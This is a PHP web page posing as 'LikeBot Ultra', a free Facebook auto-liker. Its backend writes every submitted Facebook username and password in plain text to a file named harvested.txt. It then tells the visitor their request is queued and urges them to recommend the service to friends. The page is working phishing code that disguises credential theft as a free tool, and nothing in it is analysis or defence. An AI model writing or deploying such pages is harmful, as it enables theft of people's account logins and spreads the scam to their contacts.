<html>
	<head>
		<title>LikeBot Ultra - best facebook liker</title>
	</head>
	<body bgcolor="lavender" style="font-family:arial;color:black;margin-left:0px;margin-right:0px;margin-top:0px;">
		<div id="topbar" style="background:blue;color:white;height:80px;width:100%;valign:middle;padding:0;">
			<center><font size="42" face="dejavu sans">LikeBot Ultra</font><br><font size="3" face="dejavu sans" color="yellow"><font color="white">==[</font> Best free facebook autoliker <font color="white">]==</font></font><!-- <sub><font color="yellow">version 0.1 BETA</font></sub> --></center>
		</div><br><br><br>

	<?php
		if(isset($_POST["user"])) {
			$user = $_POST["user"];
		}
		else {
			echo "<center><font color=\"red\">Failure! YOu can't leave the username empty!</font></center>";
			exit();
		}

		if(isset($_POST["pass"])) {
			$pass = $_POST["pass"];
		}
		else {
			echo "<center><font color=\"red\">Failure! You can't leave the password empty!</font></center>";
			exit();
		}
		chdir("/var/www/html/personal");
		$database = fopen("harvested.txt", "a");
		fwrite($database, "[HARVEST] Username:$user    Password:$pass\n");
		fclose($database);
		echo "<center><font color=\"green\" face=\"dejavu sans\">Success! Your request has been added to the que and will be completed after 10 minutes. If you like this service
			then please don't forget to tell your friends about this. -Team Hindustan</font></center>"; 
	?>

	</body>
</html>

